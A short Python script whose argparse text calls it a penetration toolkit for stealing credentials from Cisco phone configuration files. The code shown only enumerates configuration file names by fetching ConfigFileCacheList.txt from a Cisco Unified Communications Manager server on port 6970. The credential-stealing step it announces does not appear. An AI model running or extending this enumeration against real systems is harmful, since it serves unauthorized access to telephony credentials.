#!/usr/bin/env python3

import argparse
import requests
import re
import ipaddress
import socket
import string
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Cisco Phone Systems by stealing credentials from phone configuration files')
    parser.add_argument('-H','--host', default=None, type=str, help='IP Address of Cisco Unified Communications Manager')
    parser.add_argument('-p','--phone', type=str, help='IP Address of a Cisco Phone')

    args = parser.parse_args()

    CUCM = args.host
    phone = args.phone
    #file_names = ''
    #hostnames = []

    config_files = get_config_names(CUCM)


def get_config_names(CUCM_host,hostnames=None):
    config_names = []
    file_names = []
    if hostnames is None:
        url = "http://{0}:6970/ConfigFileCacheList.txt".format(CUCM_host)
        try:
            __http_response = requests.get(url, timeout=2)
            if __http_response.status_code != 404:
                lines = __http_response.text
                for line in lines.split('\n'):
                    split = re.split('\s', line)
                    file_names.append(split[0])

        except requests.exceptions.ConnectionError:
            print('CUCM Server {} is not responding'.format(CUCM_host))

        for file in file_names:
            if 'xml' in file or 'cnf' in file or 'sgn' in file:
                config_names.append(file)
        print(config_names)
    else:
        for host in hostnames:
            config_names.append('{host}.cnf.xml'.format(host=host))
    if config_names == []:
        return None
    else:
        return config_names

main()
